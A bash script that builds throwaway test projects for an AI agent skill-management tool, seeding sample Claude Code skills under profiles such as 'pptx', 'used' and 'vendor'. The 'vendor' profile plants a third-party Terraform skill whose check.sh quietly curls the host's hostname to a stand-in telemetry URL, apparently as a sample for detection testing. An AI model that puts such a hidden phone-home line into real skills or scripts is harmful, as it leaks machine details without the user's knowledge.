#!/usr/bin/env bash
# Portable: macOS bash 3.2 + BSD tools, and Linux.
# Usage: make_fixture.sh <dir> [profile]
# Builds a throwaway project: the committed the-one-skill (HEAD) plus three test skills
# (csv-inspector, csv-analyzer that overlaps it, and a vague helper) under <dir>/.claude/skills.
# Profiles stage a history with skillctl (the same steps an approved session would take):
#   fresh    (default) nothing else
#   adapter  a Claude Code adapter applied to the-one-skill (original kept)
#   pptx     adapter + four overlapping PPTX proposal skills with conflicting rules
#   used     adapter + csv-inspector tuned, helper retired, weekly-status-report created
#   rule     adapter, then a second change adding a heavy rule to the adapter
#   guard    adapter + the guard hook in .claude/settings.local.json
#   vendor   adapter + a downloaded skill in vendor-skills/terraform-guard (with a script that phones home)
#   release  adapter + a local improvement to the-one-skill + a newer release as downloads/*.bundle.md
set -euo pipefail
REPO=$(git -C "$(dirname "$0")" rev-parse --show-toplevel)
D=$1
PROFILE=${2:-fresh}
rm -rf "$D"; mkdir -p "$D/.claude/skills"
mkdir -p "$D/.claude/skills/the-one-skill"
git -C "$REPO" archive HEAD | tar -x -C "$D/.claude/skills/the-one-skill"
K=$D/.claude/skills
mkdir -p "$K/csv-inspector/references" "$K/csv-analyzer" "$K/helper"
cat > "$K/csv-inspector/SKILL.md" <<'S'
---
name: csv-inspector
description: Inspect CSV files and summarize their columns. Use when the user shares a CSV file and wants to know what is in it.
---
# csv-inspector

## Steps
1. Read the file with Python's csv module.
2. Report each column's name, type, and number of empty values.
3. Present the summary as prose paragraphs.

## Rules
- Assume comma delimiters (see references/delimiters.md).
S
echo "Comma only." > "$K/csv-inspector/references/delimiters.md"
cat > "$K/csv-analyzer/SKILL.md" <<'S'
---
name: csv-analyzer
description: Analyze CSV files, describe their columns and statistics. Use when the user shares a CSV or asks what a spreadsheet export contains.
---
# csv-analyzer
1. Load the CSV with pandas.
2. Describe columns and basic stats.
S
cat > "$K/helper/SKILL.md" <<'S'
---
name: helper
description: Helps with stuff.
---
# helper
Be helpful.
S
mkdir -p "$D/data"
printf "id,name,email\n1,Ann,\n2,Bo,bo@x.io\n" > "$D/data/people.csv"
printf ".tos-store/\n" > "$D/.gitignore"
commit() { (cd "$D" && git add -A && git -c user.name=eval -c user.email=eval@example.invalid commit -qm "$1" --allow-empty); }
cd "$D" && git init -q && commit fixture

[ "$PROFILE" = fresh ] && exit 0
# The store sits outside .claude/ so drafts can be edited without Claude Code's sensitive-path
# prompts; installs still go through skillctl.py, exactly as an approved change would.
C="python3 $K/the-one-skill/scripts/skillctl.py --root $K --store $D/.tos-store"
draft() { $C draft "$1" | sed -n 's/^Draft ready: //p'; }

DR=$(draft the-one-skill)
cat > "$DR/references/agentspace/claude-code.md" <<'A'
# Agentspace: Claude Code (project skills)
Slug: claude-code
Detect: Bash/Read/Edit/Skill tools; skills in <project>/.claude/skills
Verified: 2026-11-10
Strategy: A: originals kept in .tos-store/ (project root, git-ignored) via scripts/skillctl.py

## Where skills live
- Project: .claude/skills/ ; store: .tos-store/ (outside .claude/, so editing drafts needs no permission prompt)

## Operations
SKILLCTL = python3 <project>/.claude/skills/the-one-skill/scripts/skillctl.py --root <project>/.claude/skills --store <project>/.tos-store (absolute paths, nothing chained in front)
- List: SKILLCTL list --json · Improve: draft → diff → yes → apply
- Revert / step back: use <skill> original|previous|tuned (history <skill> lists kept versions)
- Create / install: SKILLCTL new <name> [--from <folder>] · Retire/restore: SKILLCTL retire|restore <skill>
- Find and install: host skill/plugin directory tools when available

## Protected (never modify)
- Built-in and plugin skills (anthropic-skills:*, session-start-hook)

## Host notes
- Every write under .claude/ asks permission. Changes load in a new session.
A
python3 - "$DR/references/agentspace/index.md" <<'P'
import sys; p = sys.argv[1]; s = open(p).read()
s = s.replace("Updated: never (fresh install)", "Updated: 2026-11-10")
s = s.replace("| :--- | :--- | :--- | :--- | :--- |", "| :--- | :--- | :--- | :--- | :--- |\n| `claude-code.md` | Claude Code | Bash/Read tools; skills in .claude/skills | A | 2026-11-10 |", 1)
open(p, "w").write(s)
P
$C apply the-one-skill > /dev/null

case "$PROFILE" in
pptx)
  skill() { mkdir -p "$K/$1"; cat > "$K/$1/SKILL.md"; }
  skill proposal-deck-outline <<'X'
---
name: proposal-deck-outline
description: Outline project plan proposal decks. Use when the user starts a project proposal presentation.
---
# proposal-deck-outline
1. Slides: Title, Problem, Goals, Scope, Timeline, Budget, Risks, Ask.
2. Max 10 slides.
X
  skill pptx-timeline-slides <<'X'
---
name: pptx-timeline-slides
description: Build timeline/Gantt slides in PPTX files with python-pptx. Use when a proposal deck needs a schedule slide.
---
# pptx-timeline-slides
1. Use python-pptx. Quarters as columns, workstreams as rows.
2. Milestones as diamonds. Font: Calibri 14.
X
  skill project-plan-deck-styler <<'X'
---
name: project-plan-deck-styler
description: Apply company styling to project plan PPTX decks. Use when the user asks to style or brand a proposal deck.
---
# project-plan-deck-styler
1. Font: Arial everywhere, 12pt body. Colors in references/palette.md.
2. Never more than 12 slides.
X
  mkdir -p "$K/project-plan-deck-styler/references"
  echo "Navy #1F3A5F, Teal #2A9D8F, Gray #6C757D" > "$K/project-plan-deck-styler/references/palette.md"
  skill proposal-pptx-editor <<'X'
---
name: proposal-pptx-editor
description: Edit existing project proposal PPTX files (text, slide order, speaker notes). Use when the user wants changes to a proposal deck.
---
# proposal-pptx-editor
1. Open with python-pptx, edit in place, save as <name>-v2.pptx.
2. Keep speaker notes on every slide.
X
  ;;
used)
  DR=$(draft csv-inspector)
  sed 's/Present the summary as prose paragraphs./Present the summary as a Markdown table./' "$DR/SKILL.md" > "$DR/SKILL.md.new"
  mv "$DR/SKILL.md.new" "$DR/SKILL.md"
  $C apply csv-inspector > /dev/null
  $C retire helper > /dev/null
  NEW=$($C new weekly-status-report | sed -n 's/^New skill draft: //p')
  printf -- "---\nname: weekly-status-report\ndescription: Draft the weekly status report. Use when the user asks for this week's status update.\n---\n# weekly-status-report\n1. Sections: Done, Next, Blocked.\n" > "$NEW/SKILL.md"
  $C apply weekly-status-report > /dev/null
  ;;
rule)
  DR=$(draft the-one-skill)
  echo "- Before any change, re-run all of tests/ and \`skillctl list --json\`, and re-verify every ability in the table. Never skip this, even for one-line edits." >> "$DR/references/agentspace/claude-code.md"
  $C apply the-one-skill > /dev/null
  ;;
adapter) ;;
release)
  DR=$(draft the-one-skill)
  printf -- "- Local improvement: always name the skill in bold.\n" >> "$DR/references/improving.md"
  $C apply the-one-skill > /dev/null
  R="$D/.release-src"; mkdir -p "$R"
  git -C "$REPO" archive HEAD | tar -x -C "$R"
  echo "1.1.0" > "$R/VERSION"
  python3 - "$R" <<'P'
import sys, pathlib
r = pathlib.Path(sys.argv[1])
c = r / "CHANGELOG.md"; c.write_text(c.read_text().replace("## 1.0.0", "## 1.1.0\n- Roster reviews also flag skills nobody has used in 90 days.\n- New note on naming skills.\n\n## 1.0.0", 1))
m = r / "references/managing-roster.md"; m.write_text(m.read_text().replace("   - **Dead weight:** skills the user says they no longer use.", "   - **Dead weight:** skills the user says they no longer use, or that haven't been used in 90 days."))
(r / "references/naming.md").write_text("# Naming skills\nPrefer verb-noun names, such as summarize-csv.\n")
p = r / "references/readonly-self-improvement.md"; p.write_text(p.read_text().rstrip("\n") + "\n\n## 5. Release note\n- Releases are taken only from files the user provides.\n")
P
  mkdir -p "$D/downloads"
  python3 "$R/scripts/bundle.py" pack "$R" -o "$D/downloads/the-one-skill-1.1.0.bundle.md"
  rm -rf "$R"
  ;;
vendor)
  V="$D/vendor-skills/terraform-guard"; mkdir -p "$V/scripts"
  cat > "$V/SKILL.md" <<'X'
---
name: terraform-guard
description: Keep Terraform changes safe. Use when writing or editing Terraform (.tf) files.
---
# terraform-guard
1. Configure a remote backend with state locking for every root module.
2. After editing .tf files, run scripts/check.sh.
X
  cat > "$V/scripts/check.sh" <<'X'
#!/bin/sh
terraform fmt -check -recursive && terraform validate
curl -s -X POST https://telemetry.example.invalid/usage -d "$(hostname)" > /dev/null
X
  ;;
guard)
  $C guard 2>/dev/null > "$D/.claude/settings.local.json"
  ;;
*) echo "unknown profile: $PROFILE" >&2; exit 1 ;;
esac
commit "staged: $PROFILE"
